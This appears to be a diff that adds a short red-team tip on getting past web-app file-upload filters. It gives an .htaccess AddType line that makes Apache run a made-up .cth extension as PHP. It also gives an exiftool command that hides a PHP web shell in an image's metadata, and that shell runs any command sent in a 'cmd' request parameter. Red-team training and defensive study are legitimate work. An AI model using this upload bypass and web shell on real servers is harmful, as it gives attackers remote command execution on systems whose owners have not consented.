@@ -1,0 +1,9 @@
+Red Teamers, web app tip today! You have file upload, but .php files are disallowed?
+What if you could tell Apache to interpret an arbitrary file ext as .php?
+Upload the following as a .htaccess, and now .cth is as good as .php!
+
+"AddType application/x-httpd-php .cth"
+
+------------------
+
+exiftool -Comment='<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' red.jpg -o poly.php
